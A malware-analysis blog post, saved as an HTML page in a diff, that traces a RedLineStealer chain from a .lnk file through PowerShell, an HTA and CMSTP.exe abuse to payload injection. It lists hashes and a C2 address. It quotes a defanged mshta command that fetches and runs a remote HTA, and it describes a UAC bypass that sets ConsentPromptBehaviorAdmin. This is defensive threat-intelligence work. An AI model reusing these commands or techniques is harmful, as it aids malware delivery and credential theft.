@@ -1,0 +1,342 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>RedLineStealer LNK&#43;Powershell&#43;HTA // </title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.101.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Finch4" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://finch4.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="RedLineStealer LNK&#43;Powershell&#43;HTA"/>
+<meta name="twitter:description" content="Executive Summary
+Technical Analysis
+Introduction
+Down the chain, the LNK
+Down the chain, the HTA
+Down the chain, the Powershell
+Down the chain, the Payload
+Conclusion
+Appendices
+Appendix A - Payload Hashes:
+Credits
+Executive Summary Lately there has been a rise in the abuse of .lnk files to download additional payloads or execute them. In this report a RedLineStealer campaign is analyzed.
+Technical Analysis Introduction The following is the execution chain in order:"/>
+
+    <meta property="og:title" content="RedLineStealer LNK&#43;Powershell&#43;HTA" />
+<meta property="og:description" content="Executive Summary
+Technical Analysis
+Introduction
+Down the chain, the LNK
+Down the chain, the HTA
+Down the chain, the Powershell
+Down the chain, the Payload
+Conclusion
+Appendices
+Appendix A - Payload Hashes:
+Credits
+Executive Summary Lately there has been a rise in the abuse of .lnk files to download additional payloads or execute them. In this report a RedLineStealer campaign is analyzed.
+Technical Analysis Introduction The following is the execution chain in order:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://finch4.github.io/posts/redline-stealer-lnk&#43;powershell&#43;hta/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-07-21T19:17:01+02:00" />
+<meta property="article:modified_time" content="2022-07-21T19:17:01+02:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://finch4.github.io/"><img class="app-header-avatar" src="/images/7KTvSX4A_400x400.jpg" alt="Finch4" /></a>
+      <h1></h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+      </nav>
+      <p>Malware Reverse Engineering Finch</p>
+      <div class="app-header-social">
+        
+          <a href="https://twitter.com/Finch39487976" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>My Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">RedLineStealer LNK&#43;Powershell&#43;HTA</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 21, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <blockquote>
+<p><a href="#executive-summary">Executive Summary</a></p>
+</blockquote>
+<p><strong><a href="#technical-analysis">Technical Analysis</a></strong></p>
+<blockquote>
+<p><a href="#introduction">Introduction</a></p>
+<p><a href="#down-the-chain-the-lnk">Down the chain, the LNK</a></p>
+<p><a href="#down-the-chain-the-hta">Down the chain, the HTA</a></p>
+<p><a href="#down-the-chain-the-powershell">Down the chain, the Powershell</a></p>
+<p><a href="#down-the-chain-the-payload">Down the chain, the Payload</a></p>
+</blockquote>
+<p><strong><a href="#conclusion">Conclusion</a></strong></p>
+<p><strong><a href="#appendices">Appendices</a></strong></p>
+<blockquote>
+<p><a href="#appendix-a---payload-hashes">Appendix A - Payload Hashes:</a></p>
+</blockquote>
+<p><strong><a href="#credits">Credits</a></strong></p>
+<h3 id="executive-summary">Executive Summary</h3>
+<p>Lately there has been a rise in the abuse of .lnk files to download
+additional payloads or execute them. In this report a RedLineStealer
+campaign is analyzed.</p>
+<h1 id="technical-analysis">Technical Analysis</h1>
+<h3 id="introduction">Introduction</h3>
+<p>The following is the execution chain in order:</p>
+<ul>
+<li>
+<p>PDF Password.txt.lnk</p>
+</li>
+<li>
+<p>Powershell</p>
+</li>
+<li>
+<p>HTA</p>
+</li>
+<li>
+<p>More Powershell</p>
+</li>
+<li>
+<p>Drops <strong>CMSTP.inf</strong> in %temp%</p>
+</li>
+<li>
+<p>Use of <a href="https://attack.mitre.org/techniques/T1218/003/"><strong>CMSTP.exe</strong></a> LOLBIN to execute <strong>CMSTP.inf</strong> to disable <strong>ConsentPromptBehaviorAdmin</strong></p>
+</li>
+<li>
+<p>Downloads a payload from transfer.]sh</p>
+</li>
+<li>
+<p>Drops another <strong>CMSTP.inf</strong> in %temp%</p>
+</li>
+<li>
+<p>Use of <a href="https://attack.mitre.org/techniques/T1218/003/"><strong>CMSTP.exe</strong></a> LOLBIN to execute <strong>CMSTP.inf</strong> to execute the payload</p>
+</li>
+<li>
+<p>Executes a copy of itself to inject the final RedLineStealer Payload</p>
+</li>
+</ul>
+<h3 id="down-the-chain-the-lnk">Down the chain, the LNK</h3>
+<p>As said before, it starts with the following LNK sample</p>
+<hr>
+<p><strong>Hash</strong>:                                09d2a9debcc7a2babdd5bc60c342de11830e87ab95930cb72004e18b1b852ff7</p>
+<hr>
+<p><strong>Threat</strong>:                              LNK Downloader</p>
+<hr>
+<p><strong>Brief Description</strong>:                   Executes POwershell that downloads additional payloads</p>
+<hr>
+<p><strong>SSDEEP</strong>:                              48:8vPAjR1xgsuV6Fj0k1c2szS3STaSdSqXknakb:8vPAV4suQFJ1ZsXaMSZ</p>
+<hr>
+<p><strong>TLSH</strong>:                                T1D341C05417FA130CE5B79E3AA9E5B3205233B951B9258FAF0180524C5E60610ED59F3B</p>
+<hr>
+<p>Using lnkanalyser we find what the .lnk is going to execute</p>
+<p><img src="/images/image9.png" alt=""></p>
+<pre><code>Figure 1: LNK arguments
+</code></pre>
+<p>Q
+A bit cleaned:</p>
+<p><img src="/images/image5.png" alt=""></p>
+<pre><code>Figure: LNK Powershell cleaned
+</code></pre>
+<p>In depth:</p>
+<ul>
+<li>
+<p><strong>$nyfZHThm</strong> and <strong>$NKLdwzBz</strong> are Base64 Decoded and then xored with <strong>0x77</strong></p>
+</li>
+<li>
+<p><strong>$nyfZHThm</strong> contains the string &ldquo;IEX&rdquo;</p>
+</li>
+<li>
+<p><strong>$NKLdwzBz</strong> contains &ldquo;mshta hxxps://transfer.]sh/get/LsUe0J/docfile.hta&rdquo;</p>
+</li>
+<li>
+<p><strong>sal</strong> is the alias for the <strong>Set-Alias</strong> cmdlet, in this case <strong>kiTkywKi</strong> is set as alias for <strong>$QCgyAskj</strong> (which is &ldquo;IEX&rdquo; -&gt; Invoke-Expression) and &ldquo;mshta hxxps://transfer.]sh/get/LsUe0J/docfile.hta&rdquo; as argument, so the powershell is going to execute the HTA payload</p>
+</li>
+</ul>
+<h3 id="down-the-chain-the-hta">Down the chain, the HTA</h3>
+<p>The HTA contains an obfuscated VBScript</p>
+<p><img src="/images/image1.png" alt=""></p>
+<pre><code>Figure: Obfuscated VBScript
+</code></pre>
+<p>Let&rsquo;s find and focus on the important parts, the code contains a lot of
+junkcode and useless deobfuscation routines, however it is very easy to
+find what we are looking for, just search for the string &ldquo;Run&rdquo; and you
+will find this array</p>
+<p><img src="/images/image17.png" alt=""></p>
+<pre><code>Figure: VBScript Array
+</code></pre>
+<h3 id="down-the-chain-the-powershell">Down the chain, the Powershell</h3>
+<p>We can deobfuscate that easily in Python</p>
+<p><img src="/images/image15.png" alt=""></p>
+<pre><code>Figure: Array deobfuscated
+</code></pre>
+<p>Let&rsquo;s clean it a bit replacing &ldquo;;&rdquo; with &ldquo;;\n&rdquo;</p>
+<p><img src="/images/image4.png" alt=""></p>
+<pre><code>Figure: Powershell cleaned
+</code></pre>
+<p>In depth:</p>
+<ul>
+<li>
+<p>The Powershell is using AES+GZIP as obfuscation</p>
+</li>
+<li>
+<p><strong>$szYTFjuruoUDZu</strong> contains the key</p>
+</li>
+<li>
+<p><strong>$njCwnPL</strong> first 16 characters are the IV</p>
+</li>
+<li>
+<p>The string less than the 16 characters are decrypted</p>
+</li>
+<li>
+<p>The buffer is Gzip decompressed</p>
+</li>
+<li>
+<p>The buffer is invoked</p>
+</li>
+</ul>
+<p><img src="/images/image7.png" alt="">
+Figure: Next Powershell Stage deobfuscated</p>
+<p>Cleaned a bit</p>
+<p><img src="/images/image16.png" alt="">
+Figure: Powershell cleaned</p>
+<p>The first function executed is <strong>dWcOjOnNxmRT</strong> which recovers the
+%appdata% path in <strong>EBvfNJBLGCy</strong> and calls Sleep for 30 seconds, then
+<strong>jmCMN</strong> is executed which Base64 decodes two strings containg more
+Powershell and executes them, this Powershell is the following</p>
+<p><img src="/images/image10.png" alt=""></p>
+<pre><code>Figure: Powershell dropping **CMSTP.inf**
+</code></pre>
+<p>This Powershell first drops <strong>CMSTP.inf</strong> in %temp% then uses the LOLBIN
+<a href="https://attack.mitre.org/techniques/T1218/003/"><strong>CMSTP.exe</strong></a>
+to execute <strong>CMSTP.inf</strong>, the latter executes another Powershell which
+sets the value of <strong>ConsentPromptBehaviorAdmin</strong> to 0 (This option
+allows the Consent Admin to perform an operation that requires elevation
+without consent or credentials).</p>
+<p>Back to the previous Powershell, now it concatenates &ldquo;%appdata%+&ldquo;Guangzh</p>
+<p>ou%20Maywei%20P.O%20099302.exe&rdquo; and checks if the path exists, if True
+calls the function <strong>DjTJSfu</strong> passing the path as argument</p>
+<p><img src="/images/image6.png" alt=""></p>
+<pre><code>Figure: Powershell dropping another **CMSTP.inf**
+</code></pre>
+<p>The sample concatenates the first decoded string with the passed path,
+it simply abuses again
+<a href="https://attack.mitre.org/techniques/T1218/003/"><strong>CMSTP.exe</strong></a>
+to execute the payload contained in &ldquo;%appdata%+&ldquo;Guangzhou%20Maywei%20P.O%20099302.exe&rdquo;</p>
+<p>Instead if the payload doesn&rsquo;t exists, it calls the function
+<strong>RmXtsbaEJ</strong> passing as parameter the return of the function
+<strong>IoCiYLWQSIBJQK</strong></p>
+<p><img src="/images/image8.png" alt="">
+Figure: Downloading the payload</p>
+<p>It contains the payload location</p>
+<p><img src="/images/image12.png" alt=""></p>
+<pre><code>Figure: Array deobfuscated
+</code></pre>
+<p>It gets the handle to the object <strong>Net.WebClient</strong> and downloads the
+payload returning the buffer</p>
+<p><img src="/images/image13.png" alt=""></p>
+<pre><code>Figure: Downloading the payload
+</code></pre>
+<p>Finally calls the function <strong>AMlph</strong> passing the path and the buffer,
+which is going to write the payload, then executes the function
+<strong>DjTJSfu</strong> which we saw before to execute it.</p>
+<h3 id="down-the-chain-the-payload">Down the chain, the Payload</h3>
+<p>The payload uses the known obfuscation with additional payloads in the
+resources</p>
+<p><img src="/images/image2.png" alt=""></p>
+<pre><code>Figure: Obfuscated Payload
+</code></pre>
+<p>At the end the payload is going to execute a copy of itself and inject
+the final RedLine Stealer payload</p>
+<p><img src="/images/image11.png" alt="">
+Figure: Payload injection</p>
+<p>Here the config</p>
+<p><img src="/images/image3.png" alt=""></p>
+<pre><code>Figure: RedLine Stealer Config
+</code></pre>
+<p>The config is encrypted obfuscated with Base64+XOR+Base64</p>
+<p><img src="/images/image14.png" alt=""></p>
+<pre><code>Figure: RedLine Stealer C2
+</code></pre>
+<p>Here the full config:</p>
+<ul>
+<li>
+<p>C2: 172.82.128.]225:1249</p>
+</li>
+<li>
+<p>ID: dart</p>
+</li>
+<li>
+<p>XOR Key: Disowns</p>
+</li>
+<li>
+<p>Version: 1</p>
+</li>
+</ul>
+<h1 id="conclusion">Conclusion</h1>
+<p>RedLine Stealer continues to be one of the most used Stealers by Cyber
+Criminals, this Payloads Chain was interesting to analyze</p>
+<h1 id="heading"></h1>
+<h1 id="heading-1"></h1>
+<h1 id="heading-2"></h1>
+<h1 id="appendices">Appendices</h1>
+<h2 id="appendix-a---payload-hashes">Appendix A - Payload Hashes:</h2>
+<ul>
+<li>
+<p>09d2a9debcc7a2babdd5bc60c342de11830e87ab95930cb72004e18b1b852ff7 (LNK)</p>
+</li>
+<li>
+<p>1c0b56a6da54aae024ca8f2d52427aed7c7dffb8a28afc94454d9f28b332ef66 (RedLine Stealer Final Payload)</p>
+</li>
+<li>
+<p>51c03c62d0fc7a8575e84e7dfea73a33b4c2fcc17ce07891e80cc944e8a74871 (First Payload - Guangzhou Maywei P.O 099302.exe)</p>
+</li>
+<li>
+<p>cf3ca8e880286f41136b78d6fb9788273f3d143af2de29fdc4c99a3febba327a (HTA)</p>
+</li>
+</ul>
+<h1 id="credits">Credits</h1>
+<ul>
+<li>Finch (<a href="https://twitter.com/Finch39487976">Twitter</a>)</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
